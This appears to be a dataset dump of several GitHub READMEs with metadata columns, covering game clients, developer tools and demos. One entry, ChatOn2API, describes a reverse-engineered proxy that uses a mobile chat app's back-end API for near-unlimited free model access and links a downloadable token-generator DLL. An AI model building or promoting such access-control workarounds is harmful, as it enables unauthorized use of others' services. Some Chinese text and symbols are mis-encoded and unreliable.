",11,0,1,Apache-2.0,1,0.0,0.0,1.0,1.0,2.0,0.0,-0.15,0.0
GlideClient/client,main,"<p align=""center"">
  <img src=""/.github/assets/GlideClientLogo.png"" alt=""Glide Client. An updated version of Soar client"" title=""GlideClient"">
</p>

## More features, fixes and quality of life.
### Join our discord! https://glideclient.github.io/discord
<br>


## License 
Glide uses [GPL v3](https://github.com/GlideClient/client/blob/main/LICENSE) which is a different licence from [Soar](https://github.com/Soar-Client/Legacy-SoarClient) since some code within internal repo was incompatible with the [mit licence](https://github.com/Soar-Client/Legacy-SoarClient/blob/main/LICENSE) of the [Soar repo](https://github.com/Soar-Client/Legacy-SoarClient) because of this if you want to use code under the [mit licence](https://github.com/Soar-Client/Legacy-SoarClient/blob/main/LICENSE) you can take it from [Soar Client](https://github.com/Soar-Client/Legacy-SoarClient), not here

## Issues
Please either contact us on discord or make a github issues if there is any issues you need to bring to our attention

## building (assuming intelij idea)
```
gradlew setupdecompworkspace
```
```
gradlew genIntellijRuns
```
```
gradlew build
```

## Platform support
windows (working well) <br>
linux (working but some issues noticed that can be fixed by using the fps limit mod) <br>
mac os (not working, it is missing lwjgl 3 and nanovg natives for mac os)

## Future
I dont want glide to compete with [Soar Client](https://github.com/Soar-Client/Legacy-SoarClient) so when [Soar Client](https://github.com/Soar-Client/Legacy-SoarClient) V8 releases this project will be instantly archived 





",1,1,2,GPL-3.0,1,3.0,0.0,1.0,1.0,4.0,0.0,-0.65,0.0
JetBrains/jitwatch4i,master,"<img src=""src/main/resources/META-INF/pluginIcon.svg"" width=""80"" height=""80"" alt=""icon"" align=""left""/>

JITWatch4i
===

[![Contributions welcome][contributions-welcome-svg]][contributions-welcome]
[![Version](https://img.shields.io/jetbrains/plugin/v/25979-jitwatch4i.svg)](https://plugins.jetbrains.com/plugin/25979-jitwatch4i)

<!-- TOC -->
* [JITWatch4i](#jitwatch4i)
  * [Features](#features)
  * [Overview](#overview)
    * [Creating and Opening a Compilation Log](#create-logs)
    * [Toolwindow](#toolwindow)
      * [Main](#main)
      * [Top Lists](#top-lists)
      * [Compilers' Activity](#compilers-activity)
      * [Time Line](#time-line)
      * [Histograms](#histograms)
      * [Free Code Cache](#free-code-cache)
      * [Code cache layout](#code-cache-layout)
      * [Compilation Chain](#compilation-chain)
      * [Code Suggest](#code-suggest)
    * [Editor](#editor)
  * [Installation](#installation)
  * [Credits](#credits)
<!-- TOC -->


Analysis and visualization of logs and assembly code from the JVM JIT (Just-In-Time) compiler, built as a plugin for IntelliJ IDEA.
It is based on the foundations of [JitWatch](https://github.com/AdoptOpenJDK/jitwatch) by Chris Newland and 
[jitwatch-intellij](https://github.com/yole/jitwatch-intellij) by Dmitry Jemerov.


## Features

- **Compiled packages/classes/methods**: Lists compiled methods organized in a package-class tree, shows compilation times, 
  optimization levels (L1‚ÄìL4), and compiler type.
- **Analysis**: Provides a range of tools to visualize and analyze JIT compilation data, including activity timelines, 
  memory usage, and performance metrics.
- **Code Integration**: Displays bytecode and assembly code side-by-side with the original Java source, with syntax highlighting.


## Overview

### Creating a Compilation Log

To analyze JIT compilation data using the plugin, you need to have a compilation log. If one does not already exist, 
you can easily create it by enabling the ""Log compilation"" option in your run configuration settings. When enabled, 
this will generate a HotSpot log in a temporary directory.

Alternatively, you can add the logging options to the VM options of your run configuration, and then load the log file 
manually. To enable logging, you need the following options:
```
-XX:+UnlockDiagnosticVMOptions
-XX:+TraceClassLoading
-XX:+LogCompilation
-XX:+PrintAssembly
-XX:LogFile=my_compilation.log
```

### Opening a Compilation Log

After creating the compilation log, simply open it in the plugin. JITWatch4i will automatically parse the log and 
present the resulting analysis in tabs in toolwindow.

### Toolwindow

#### Main
Lists compiled methods organized in a class tree, shows compilation times, optimization levels (L1‚ÄìL4), and compiler type.
![MainPanel](.github/images/panel_main.png)

#### Top lists
Tab ""Tops"" Displays methods ranked by various metrics, including the largest generated code, longest compilation times, most 
frequent deoptimizations, and failed inlining attempts.
![MainPanel](.github/images/panel_tops.png)

#### Compilers Activity
Shows compilers' thread activity over time, with compilations represented by rectangles sized by generated code. Compilations are selectable.
![MainPanel](.github/images/panel_comp_activity.png)

#### Time Line
Shows a timeline of compilations categorized by optimization levels (L1‚ÄìL4), illustrating how compilation activity changes over time. Levels L1+L2+L3 are compiled by C1, L4 is compiled by C2.
![MainPanel](.github/images/panel_timeline.png)

#### Histograms
Tab ""Histo"" provides histograms to analyze the distribution of compiled code sizes, compilation durations, and sizes of inlined methods.
![MainPanel](.github/images/panel_histo.png)

#### Free Code Cache
Tracks the allocated memory in the Code Cache over time.
![MainPanel](.github/images/panel_free_cc.png)

#### Code Cache Layout
Tab ""CC Layout"" displays a detailed layout of the Code Cache memory.
![MainPanel](.github/images/panel_cc_layout.png)

#### Compilation Chain
Tab ""Comp Chain"" shows the compilation structure of methods, including inlined methods and external calls.
![MainPanel](.github/images/panel_comp_chain.png)

#### Code Suggest
Identifies performance-critical areas such as:
  - **Hot Methods**: shows info about methods that were not inlined, with reasons for inlining failures.
  - **Branch Prediction**: identifies unpredictable branches that impact performance.
![MainPanel](.github/images/panel_code_suggest.png)


### Editor

The editor provides seamless integration with the plugin's features. The **Jitwatch** tool window on the right edge 
displays a synchronized view of the bytecode and assembly code for the currently selected method. As you navigate 
through the source code in the editor, the bytecode and assembly views automatically update to reflect 
the corresponding position.

## Installation

- Using the IDE built-in plugin system:

  <kbd>Settings/Preferences</kbd> > <kbd>Plugins</kbd> > <kbd>Marketplace</kbd> > <kbd>Search for ""jitwatch4i""</kbd> >
  <kbd>Install</kbd>

### Credits
This plugin is based on:
- [JitWatch](https://github.com/AdoptOpenJDK/jitwatch) by Chris Newland.
- [jitwatch-intellij](https://github.com/yole/jitwatch-intellij) by Dmitry Jemerov


[contributions-welcome-svg]: http://img.shields.io/badge/contributions-welcome-brightgreen
[contributions-welcome]: https://github.com/JetBrains/jitwatch4i/blob/master/CONTRIBUTING.md
",0,1,1,NOASSERTION,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
patchescamerababy/ChatOn2API,main,"ËøôÊòØ‰∏Ä‰∏™OpenAI Á±ªÊúçÂä°Á´ØÁ®ãÂ∫è

Áî±üëáÂàÜÊûêËÄåÊù•

	https://play.google.com/store/apps/details?id=ai.chat.gpt.bot


Êú¨È°πÁõÆÊòØ‰∏Ä‰∏™Á±ª OpenAI ÊúçÂä°Á´ØÁ®ãÂ∫èÔºåÂêëÊé•ÂÖ•OpenAI„ÄÅAnthropicÁöÑÊüê‰∏™APIÂèëÈÄÅËØ∑Ê±ÇÔºåÁÑ∂ÂêéÊ®°ÊãüOpenAI APIÊ†áÂáÜÁöÑÂìçÂ∫î

Áî±‰∫éÊòØÁ¨¨‰∏âÊñπÊé•ÂÖ•ÁöÑAPIÔºåÊúÄÁªàËøîÂõûÂÜÖÂÆπÁî±‰ªñ‰ª¨ÊâÄÂÜ≥ÂÆöÔºåÊòØÂê¶ÈôçÊô∫ÈúÄËá™Ë°åÂà§Êñ≠

ÂèØ‰∏éÂ§öÁßçÂâçÁ´ØÂ∫îÁî®ÔºàÂ¶Ç NextChat„ÄÅChatBox Á≠âÔºâÊó†ÁºùÈõÜÊàê

DemoüëáÊúâÈôêËØïÁî®„ÄÅÈúÄË¶ÅÊèê‰æõ‰ªªÊÑèauthorizationÔºåÂùáÊîØÊåÅËÅîÁΩë„ÄÇÂ¶ÇÊûú‰º†ÂÖ•ÁöÑmodel‰∏çÊ≠£Á°ÆËá™Âä®ÂõûËêΩËá≥gpt-4o

ÂØπËØùÔºöÊîØÊåÅ‰∏ä‰º†ÂõæÁâá„ÄÇÂ∑≤ÊâãÂä®Â±èËîΩÂú®Ê≠§Ë∑ØÂæÑÁöÑÁîªÂõæËØ∑Ê±ÇÔºåÂõ†‰∏∫‰ªñ‰ª¨ËøîÂõûÁöÑURLÊú¨Ë¥®‰∏çÂèØËÆøÈóÆÁöÑÔºåÈúÄË¶ÅÁî±ÊúçÂä°Á´ØÊèêÂèñË∑ØÂæÑ„ÄÅÊõøÊç¢URLÂÜç‰∏ãËΩΩ

	https://api-chaton.pages.dev/v1/chat/completions
 
Á§∫‰æã

 	curl --request POST 'https://api-chaton.pages.dev/v1/chat/completions' \
 	--header 'Content-Type: application/json' \
 	--header ""Authorization: Bearer 123"" \
 	--data '{""top_p"":1,""stream"":false,""temperature"":0,""messages"":[{""role"":""user"",""content"":""hello""}],""model"":""gpt-4o""}'
  
ÁîªÂõæÔºö‰ªÖ‰∏∫gpt-4o/gpt-4o-mini

 	https://api-chaton.pages.dev/v1/images/generations

  

Á§∫‰æãÔºàËøôÈáåmodel„ÄÅstyleÂ≠óÊÆµÊó†ÊÑè‰πâÔºå‰ªÖ‰∏∫Âç†‰ΩçÔºâ

	curl --request POST 'https://api-chaton.pages.dev/v1/images/generations' \
	--header 'Content-Type: application/json' \
	--header ""Authorization: Bearer 123"" \
	--data '{""prompt"":""girl"",""response_format"":""b64_json"",""model"":""gpt-4o"",""style"":""vivid""}'
 
ÊàñËÄÖ

 	curl --request POST 'https://api-chaton.pages.dev/v1/images/generations' \
	--header 'Content-Type: application/json' \
	--header ""Authorization: Bearer 123"" \
	--data '{""prompt"": ""girl"", ""model"": ""gpt-4o"", ""n"": 1, ""size"": ""1024x1024""}'

Áî±‰∫éÊúâCFÁõæÔºåËØ∑Ê±ÇÈ¢ëÁπÅ‰ºöÊúâ429

ÊîØÊåÅÁöÑÊ®°Âûã

gpt-4o‚úÖ

gpt-4o-mini‚úÖ

claude 3.5 sonnet‚úÖ(claude-3-5-sonnet) (ÂèàÂèØ‰ª•‰ΩøÁî®‰∫Ü)

claude Haiku‚úÖ(claude)

Âá†‰πéÊó†Èôê‰ΩøÁî®ÔºåÂá†‰πéÊ≤°ÊúâÈ¢ëÁéáÈôêÂà∂Ôºå‰ªñ‰ª¨ÁöÑAPIÂØπmax_tokens‰∏ç‰ΩúÂà§Êñ≠Ë¶ÅÊ±ÇÔºåÊé®ÊµãÂú®8000Â∑¶Âè≥„ÄÇ ÈÄÇÂêàÊúâÈ´òÈ¢ëËØ∑Ê±ÇÁöÑÈúÄÊ±Ç

Êú¨È°πÁõÆÊú™ÂÅöAuthorizationÈ™åËØÅ

ÊîØÊåÅÁöÑÂäüËÉΩ

Completions: ÔºàÂùáÂèØËÅîÁΩëÊêúÁ¥¢Ôºâ

	/v1/chat/completions


TextToImage:Ôºà‰ªÖÈôê‰∫é gpt-4o Âíå gpt-4o-mini Ê®°ÂûãÂèØÁîªÂõæÔºåÁõÆÂâçÂõ∫ÂÆö‰∏∫gpt-4oÔºâ

	/v1/images/generations

ImageToTextÔºöÂèØ‰º†Áõ¥ÈìæÔºåÂ¶ÇÊûú‰º†base64ÁºñÁ†ÅÁöÑÂõæÁâáÈúÄË¶ÅÈÉ®ÁΩ≤Âú®ÂÖ¨ÁΩë

Usage:

	--port 

ÊåáÂÆöÁöÑÁ´ØÂè£ÔºåÈªòËÆ§80

 	--base_url

OpenAIÊ†áÂáÜ‰∏≠Êúâ‰∏§ÁßçÊ†ºÂºèÔºåBase64ÁºñÁ†ÅÂíåURLÁõ¥ÈìæÔºåÂØπ‰∫éÂêéËÄÖÔºåÊú¨È°πÁõÆ‰ºöÁõ¥Êé•Â∞ÜURLÂèëÈÄÅÂá∫ÂéªÔºåÂØπ‰∫éÂâçËÄÖÂàôÂøÖÈ°ªÂ∞ÜÊú¨Á®ãÂ∫èÈÉ®ÁΩ≤Âú®ÊúçÂä°Âô®‰∏ä

ËøôÊòØ‰º†ÂõæÈúÄË¶ÅÁöÑURLÔºå‰∏∫httpÊàñhttpsÂºÄÂ§¥ÁöÑurlÔºå‰∏ç‰ª•/ÁªìÂ∞æÔºåÁ°Æ‰øùËøô‰∏™urlËÉΩË¢´Â§ñÈÉ®ËÆøÈóÆÔºåÂøÖÈ°ªÂèØË¢´ËÆøÈóÆÔºåÂê¶Âàô‰ºöÊä•Èîô

‰æãÂ¶Ç:

python3 main.py --port 80 --base_url https://example.com

java -jar 80 https://example.com

Á®ãÂ∫è‰ºöËá™Âä®Âú®base_urlÂêéÊ∑ªÂä†/images/+ÈöèÊú∫ÂõæÁâáÂêç

Á®ãÂ∫èËá™Â∏¶ÁÆÄÊòìhttpËÆøÈóÆÂäüËÉΩÔºåÈªòËÆ§Â∞ÜÊé•Êî∂Âà∞ÁöÑBase64ÂõæÁâáÂú®Á®ãÂ∫èÊâÄÂú®Ë∑ØÂæÑÁöÑimages‰∏ãÔºå‰ºöËá™Âä®Ê∏ÖÁêÜ1ÂàÜÈíüÂâçÁöÑÂõæÁâáÔºå‰πüÂèØÁî®nginxÊê≠Âª∫httpÁ®ãÂ∫è

‰æãÂ¶Ç‰ºö‰∏ä‰º†https://api-chaton.pages.dev/images/[uuid].pngÔºåÂàôÂ°´ÂÖ•ÁöÑbase_url‰∏∫https://api-chaton.pages.dev

BearerÊ†∏ÂøÉÁÆóÊ≥ïÂèØËÅîÁ≥ªüìßpatches.camera_0m@icloud.comËé∑Âèñ

‰∏™‰∫∫‰ΩøÁî®ÂèØÈÄöËøáJava JNIË∞ÉÁî®‰ª•‰∏ãDLL

	https://api-chaton.pages.dev/bearer_token_generator.dll

Âú®src/utils/BearerTokenGeneratorNative.java‰∏≠Ë∞ÉÁî®
",0,3,1,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
danvega/repo-content-generator,master,"# Repository Content Generator

A Spring Boot web application that fetches and concatenates repository content from GitHub. This tool helps developers quickly view and aggregate content from multiple files in a GitHub repository, making it easier to analyze codebases and generate documentation.

![GitHub Repo Concatenator](./images/gh_concat.png)

You can also select files from a local directory if you're running this on your local machine

![Local Directory](./images/local_dir.png)

## Features

- Web-based interface for entering GitHub repository URLs
- Configurable file pattern inclusion/exclusion
- Support for recursive directory traversal
- Real-time content generation with HTMX
- Copy-to-clipboard functionality
- Modern UI with Tailwind CSS

## Requirements

- Java 23 or higher
- Maven 3.6+
- GitHub Personal Access Token
- Modern web browser with JavaScript enabled

## Dependencies

Key dependencies include:

- Spring Boot 3.4.0
- JTE (Java Template Engine) 3.1.12
- HTMX 1.9.10
- Tailwind CSS
- Jackson (for JSON processing)

## Configuration

The application uses YAML configuration. Key settings:

```yaml
github:
   token: ${GITHUB_TOKEN}  # Set via environment variable
   includePatterns:
      - ""**/*.md""
      - ""**/*.txt""
      - ""**/*.xml""
      - ""**/*.java""
      - ""**/*.jte""
      - ""**/*.yaml""
      - ""**/*.yml""
      - ""**/*.graphqls""
   excludePatterns:
      - "".mvn/**""
      - "".idea/**""
      - ""target/**""
      - "".gitignore""
      - "".gitattributes""
```

## Getting Started

1. Set up your GitHub token:
   ```bash
   export GITHUB_TOKEN=your_github_personal_access_token
   ```

2. Start the application:
   ```bash
   ./mvnw spring-boot:run
   ```

3. Access the web interface at `http://localhost:8080`

## How It Works

The application follows this process:

1. User submits a GitHub repository URL
2. Backend extracts owner and repository name
3. Application recursively fetches repository contents using GitHub API
4. Files matching include patterns (and not matching exclude patterns) are processed
5. Content is concatenated and returned to the frontend
6. Results are displayed in a copyable text area

## Code Example

Here's how to use the service programmatically:

```java
@Autowired
private GitHubService githubService;

public void processRepository(String owner, String repo) {
   try {
      githubService.downloadRepositoryContents(owner, repo);
      // Content will be saved to output/${repo}.md
   } catch (IOException e) {
      // Handle error
   }
}
```

## Development Notes

- JTE templates are used for server-side rendering
- Development mode is enabled by default for JTE
- For production, disable development mode and enable precompiled templates
- The application uses Spring Boot's RestClient for GitHub API communication

## Template Configuration

For production deployments, update `application.properties`:

```properties
# Development
gg.jte.development-mode=false
gg.jte.use-precompiled-templates=true
```

## Security Considerations

- GitHub token is required and should be kept secure
- Token permissions should be limited to repository read access

## Rate Limiting

The application is subject to GitHub API rate limits:

- Without authentication: 60 requests per hour per IP address
- With authentication (using a token): 5,000 requests per hour per user

If you exceed these limits, you'll receive a 403 Forbidden error like this:
```
Error generating readme: 403 Forbidden: ""{""message"":""API rate limit exceeded... Check out the documentation for more details.""}""
```

To avoid rate limiting issues:
- Always use an authenticated token
- Monitor your API usage through GitHub's API
- Consider implementing request caching for frequently accessed repositories
- For large repositories, plan your requests carefully to stay within limits

You can check your current rate limit status by calling:
`https://api.github.com/rate_limit`


## System Instructions 

These are the system instructions I am using in my Claude Project: 

```text
You are an expert technical writer specializing in writing documentation for software projects. You are tasked with writing a new README file for the given project. Your goal is to create an informative documentation for
software engineers that visit the following repository.

First, here's the name of the repository:
<name>
{NAME}
</name>

To give you context here is all of the current documentation and source code for the project
<src>
{SRC}
</src>


When writing the README, follow these guidelines:

1. Structure:
   - Begin with an attention-grabbing introduction
   - Include the following sections but don't limit yourself to just these
        - Project Requirements
        - Dependencies
        - Getting Started
            - For the getting started you don't need to include instructions on how to clone the repo, they are already here
        - How to run the application
        - Relevant Code Examples
   - End with a conclusion that summarizes key points and encourages reader engagement

2. Tone and Style:
   - Write in a friendly, natural and educational tone
   - Use clear, concise language
   - Incorporate relevant examples and analogies to explain complex concepts
   - Use lists when appropriate but don't overuse them

3. Text Formatting:
   - The output of this document will be Markdown
   - Use headers (H1 for title, H2 for main sections, H3 for subsections)
   - Keep paragraphs short (3-5 sentences)
   - Proofread for grammar, spelling, and clarity
   - Avoid using any of the following words if possible {WORD_EXCLUDE_LIST}

4. Code Formatting:
    - Use clean and concise code examples
    - Avoid including import statements or package declarations for brevity
    - Use consistent indentation (prefer spaces to tabs)
    - Use meaningful variable and function names
    - Break long lines of code for readability
    - If showing output, clearly separate it from the code
    - Include a brief explanation before and/or after each code block

5. Output:
   - The output of the README should be in markdown format
   - Use code fences when possible and the correct language definiton

5. Artifact Usage:
   - Place the entire README content within an artifact
   - Use the artifact type ""text/markdown"" for the documentation
   - Give the artifact a descriptive identifier like ""{{topic}}-README""
   - Include a title attribute for the artifact
   - Use code fences when possible and the correct language definiton

Once you've completed your outline, write the full blog post and place it within an artifact. The artifact should use the type ""text/markdown"", have a descriptive identifier, and include a title attribute.

Remember to tailor the content towards an audience of software developers.
```",0,1,2,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,6.0
esmaeilsadeghijob/Application-of-Consensus-Algorithms-in-Improving-the-Scalability-of-Microservice-Architecture,main,"Ôªø# Boosting Scalability in Microservice Architectures with Consensus Mechanisms

### Overview This project demonstrates a microservices architecture using Spring Boot, Consul for service discovery, Spring Cloud Gateway as the API Gateway, Paxos for consensus, and the Enhanced Saga pattern for transaction

### Conclusion
````
This sample implementation demonstrates how to use Paxos consensus algorithms in a Spring Boot application to improve the scalability and reliability of microservice architectures. By comparing this implementation with the enhanced Saga pattern, you can evaluate the performance and effectiveness of each approach in managing distributed transactions.
````

### Project Stracture
````
spring-boot-microservices/
    ‚îú‚îÄ‚îÄ api-gateway/
    ‚îú‚îÄ‚îÄ order-service/
    ‚îú‚îÄ‚îÄ payment-service/
    ‚îú‚îÄ‚îÄ saga-service/
    ‚îú‚îÄ‚îÄ paxos-service/
    ‚îî‚îÄ‚îÄ README.md
````

## Components 
1. **API Gateway**: Handles routing of requests to appropriate microservices. 
2. **Order Service**: Manages orders and integrates with Paxos for consensus. 
3. **Payment Service**: Manages payments related to orders. 
4. **Consul**: Provides service discovery and health checking. 
5. **Paxos Service**: Ensures consensus and consistency across microservices. 
6. **Saga Service**: Coordinates distributed transactions to ensure data integrity. ## Prerequisites

## Prerequisites 
- JDK 17 or higher 
- Maven 
- Consul 

## Running the Project 
1. **Start Consul**: 
````sh 
consul agent -dev 
````
2. **Build and Run Each Microservice**: 
   - **API Gateway**: 
        ```sh
        cd api-gateway
        mvn clean install
        mvn spring-boot:run
      ``` 
   - **Order Service**: 
       ```sh
        cd order-service
        mvn clean install
        mvn spring-boot:run
      ``` 
   - **Payment Service**: 
       ```sh
        cd payment-service
        mvn clean install
        mvn spring-boot:run
      ```


## Contact
**For any questions or support, please contact esmaeil sadeghi at [esmaeilsadeghijob@gmail.com](mailto:esmaeilsadeghijob@gmail.com)**.
",2,0,4,,2,8.0,1.0,2.0,1.0,6.0,0.0,-1.7,0.0
DebitCardz/packet-logger,main,"# packet-logger

packet-logger is a plugin that simply tracks the packets coming and going from your server and
displays it in a digestible and easy graph.

---

### üõ† How Does It Work?
packet-logger collects anonymous packet data from your server and the clients connected to your server
which is then saved into a SQLite file every 5 seconds by default.

You can then simply download the SQLite file and parse it using the provided Python script
to analyze the amount of packets and size of those packets.

---

### üêç Analyze Using the Python Script
> [!NOTE]
> This script was tested with Python 3.11.4 and Plotly 5.24.1

To analyze your data simply use the [Python Script](https://raw.githubusercontent.com/DebitCardz/packet-logger/refs/heads/main/scripts/graph.py) 
to parse your SQLite file. And use `pip install plotly` so we can create the graphs.

Execute your Python Script by using `python <script>.py --file <file>` or place your script
in the same directory as your SQLite file and rename your SQLite file to `packet.sqlite` for it to parse.

After you've executed the command you'll be prompted to enter whether you want to see all packets, only incoming or only outgoing then
whether you want to see the packets every minute or every hour. After that it'll parse the SQLite file and you'll be greeted
with a visualized representation of your server and client packets.

![Viewer Screenshot](https://github.com/user-attachments/assets/5229b879-de55-4224-ac1d-474f14355587)",3,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
developer-krushna/MT-Document-Provider-Injector,main,"# MT-Document-Provider-Injector
Technic used to Inject Document Provider in [MT Manager Mod](https://t.me/Modder_Hub/844)
## What you will learn
- [x] Parsing & Modifying Android Manifest at binary level using [pxb-axml](https://github.com/Sable/axml)
- [x] Usage of [bin-zip](https://github.com/L-JINBIN/ApkSignatureKiller/tree/master/mt/bin/zip)
- [x] Step wise progress while processing

## Project build by 
- AIDE(Developing projects on Android)
## Special thanks to
- [L-JinBin](https://github.com/L-JINBIN) for providing all such great projects. Without him i think, Iam not in this field üòÇ. But i am sorry üôè
- [Timscriptov](https://github.com/timscriptov) for modifying both [pxb-axml](https://github.com/timscriptov/axmlparser) and [bin-zip](https://github.com/timscriptov/apkparser)
- [ChatGPT](https://chatgpt.com) for helping me to add comments in the code for better understanding ‚ò∫Ô∏è

## This project is already used in MT Manager Mod
- [Download MT Manager Mod](https://t.me/Modder_Hub/844)

## My work
- [Download Modder Hub](https://modder-hub.blogspot.com)

## Join Telegram
- [Coding Guys](https://t.me/coding_guys)
  
# License
    Copyright (C) 2024 Krushna Chandra

    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
CH3COOK2023/Java-Hand-Writing-Digit-Recognition-Application,main,"# Java Hand Writing Digit Recognition

> # JavaÊâãÂÜôÊï∞Â≠óËØÜÂà´

Read [How to implement a neural network for handwritten digit recognition in Java.pdf](https://github.com/CH3COOK2023/Java-Hand-Writing-Digit-Recognition-Application/blob/main/How%20to%20implement%20a%20neural%20network%20for%20handwritten%20digit%20recognition%20in%20Java.pdf) for more information!

> ÈòÖËØª [Â¶Ç‰ΩïÂú®Java‰∏≠ÂÆûÁé∞ÊâãÂÜôÊï∞Â≠óËØÜÂà´Á•ûÁªèÁΩëÁªú.pdf](https://github.com/CH3COOK2023/Java-Hand-Writing-Digit-Recognition-Application/blob/main/Â¶Ç‰ΩïÂú®Java‰∏≠ÂÆûÁé∞ÊâãÂÜôÊï∞Â≠óËØÜÂà´Á•ûÁªèÁΩëÁªú.pdf) Êñá‰ª∂‰ª•Ëé∑ÂæóÊõ¥Â§ö‰ø°ÊÅØÔºÅ



## Setup

> ## ÂàùÂßãÂåñ

Import it and then run the `Application` class to start the program.

> ÂØºÂÖ•ÂêéËøêË°å`Application` Á±ª‰ª•ÂêØÂä®Á®ãÂ∫è

<img src=""./imageResource/image-20241217173028697.png"" alt=""image-20241217173028697"" style=""zoom: 50%;"" />

**STEP 1:**

$\color{red}VERY~~IMPORTANT$

$\color{red}VERY~~IMPORTANT$

$\color{red}VERY~~IMPORTANT$

When starting the program for the first time, please click on `Settings` -> `Refresh Resource Files Again` in the upper left corner. (Only for the first time setup)

> ÂàùÊ¨°ÂêØÂä®Á®ãÂ∫èËØ∑ÂçïÂáªÂ∑¶‰∏äËßí  `ËÆæÁΩÆ` -> `ÈáçÊñ∞Âà∑Êñ∞ËµÑÊ∫êÊñá‰ª∂` (‰ªÖ‰ªÖÈíàÂØπÁ¨¨‰∏ÄÊ¨°ÂêØÂä®)

<img src=""./imageResource/image-20241217184752242.png"" alt=""image-20241217184752242"" style=""zoom: 67%;"" />

**STEP 2:**

Then, click on `Read the Previous Model` to obtain the already trained model. (Every single time the program is started, the program will not read any model. Instead, it will randomize the neural network.)  :)

> ÁÑ∂ÂêéÔºåÁÇπÂáª`ËØªÂèñÂÖàÂâçÊ®°Âûã`Êù•Ëé∑ÂèñÂ∑≤ÁªèËÆ≠ÁªÉÂ•ΩÁöÑÊ®°ÂûãÔºàÊØèÊ¨°ÂêØÂä®Á®ãÂ∫èÔºåÁ®ãÂ∫èÈÉΩ‰∏ç‰ºöËØªÂèñ‰ªª‰ΩïÊ®°ÂûãÔºåËÄåÊòØÊääÁ•ûÁªèÁΩëÁªúÂÅö‰∏Ä‰∏™ÈöèÊú∫Ôºâ:)

<img src=""./imageResource/image-20241217185102809.png"" alt=""image-20241217185102809""  />

**STEP 3:**

Try to write a number and then click on `Predict This Image` button.

> Â∞ùËØïÂÜô‰∏Ä‰∏™Êï∞Â≠óÔºåÁÑ∂ÂêéÁÇπÂáª`È¢ÑÊµãÊ≠§ÂõæÂÉè`

![image-20241217185844494](./imageResource/image-20241217185844494.png)

## Verify Accuracy Of The Current Model

> ## È™åËØÅÂΩìÂâçÊ®°ÂûãÁöÑÂáÜÁ°ÆÂ∫¶



Click `Verify the Model Accuracy with the Validation Set` button.

> Êåâ‰∏ã`‰ª•È™åËØÅÈõÜÈ™åËØÅÊ®°ÂûãÂáÜÁ°ÆÂ∫¶`ÊåâÈíÆ

![image-20241217190426681](./imageResource/image-20241217190426681.png)
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Pedro-Pathing/Quickstart,master,"## Welcome to the Offical Pedro Pathing Quickstart!  

Follow the steps on our [website](https://pedropathing.com/) to tune and setup!  
Feel Free to reach out on the [Offical Pedro Pathing Discord Server](https://discord.gg/2GfC4qBP5s)!
",8,0,1,BSD-3-Clause,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
LegacyLands/legacy-lands-library,main,"<div align=""center"">
    <img src=""./logo.png"">
    <br /><br />
    <a href=""https://app.codacy.com/gh/LegacyLands/legacy-lands-library/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade""><img src=""https://app.codacy.com/project/badge/Grade/cccd526f9bc94aaabc990dd65920cd21""/></a>
    <a><img alt=""Issues"" src=""https://img.shields.io/github/issues/LegacyLands/legacy-lands-library""></a>
    <a><img alt=""Stars"" src=""https://img.shields.io/github/stars/LegacyLands/legacy-lands-library""></a>
    <a><img alt=""Forks"" src=""https://img.shields.io/github/forks/LegacyLands/legacy-lands-library""></a>
    <a><img alt=""License"" src=""https://img.shields.io/github/license/LegacyLands/legacy-lands-library""></a>
    <br /><br />
    <p>Based on <a href=""https://github.com/FairyProject/fairy"" target=""_blank"">Fairy Framework</a>, it runs as a plugin, aiming to encapsulate various existing libraries to simplify the development of plugins.</p>
</div>

## Overview

A comprehensive library built on [Fairy Framework](https://github.com/FairyProject/fairy), providing essential tools and utilities for modern Minecraft plugin development. It is cross-platform and supports Spigot Paper and Folia.

## Core Modules

- [**annotation**](annotation/README.md) - Powerful annotation processing framework with flexible scanning options and lifecycle management
- [**commons**](commons/README.md) - Essential utilities including VarHandle injection, task scheduling, and JSON operations
- [**configuration**](configuration/README.md) - Flexible configuration framework built on SimplixStorage with serialization support
- [**mongodb**](mongodb/README.md) - Streamlined MongoDB integration with Morphia for efficient data persistence
- [**cache**](cache/README.md) - Multi-level caching system integrating Caffeine and Redis with comprehensive lock mechanisms
- [**player**](player/README.md) - High-performance player data management with multi-tier caching and real-time synchronization


- **security** - *Coming soon*

## Usage

### Distribution Packages

Download from [Actions](https://github.com/LegacyLands/legacy-lands-library/actions):
- `-javadoc`: Generated API documentation
- `-plugin`: Compiled plugin for direct server use
- `-sources`: Source code with compiled classes (recommended for development)

Detailed documentation in each module's `README`

### Maven Repository

Configure GitHub authentication first ([Learn More](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens))

```kotlin
repositories {
    maven {
        url = uri(""https://maven.pkg.github.com/LegacyLands/legacy-lands-library"")
        credentials {
            username = project.findProperty(""gpr.user"") as String? ?: System.getenv(""USERNAME"")
            password = project.findProperty(""gpr.key"") as String? ?: System.getenv(""TOKEN"")
        }
    }
}

dependencies {
    implementation(""net.legacy.library:module-name:version"")
}
```

## Community

- [‰∏≠ÊñáÊñáÊ°£](README_ZHCN.md)
- [QQ Group](http://qq.legacylands.cn)
- [Github Issues](https://github.com/LegacyLands/legacy-lands-library/issues)
- [Bilibili](https://space.bilibili.com/1253128469) (Chinese tutorials)

We will release more development tutorials and experience sharing about this module or [Fairy Framework](https://github.com/FairyProject/fairy) in the [Bilibili](https://space.bilibili.com/1253128469) channel!

## Sponsors

Fully sponsored and maintained by [LegacyLands](https://github.com/LegacyLands).

![legacy-lands-logo.png](./legacy-lands-logo.png)

[Luminol](https://github.com/LuminolMC/Luminol)
is a Folia fork with many useful optimizations, configurable vanilla features, and more API supports.

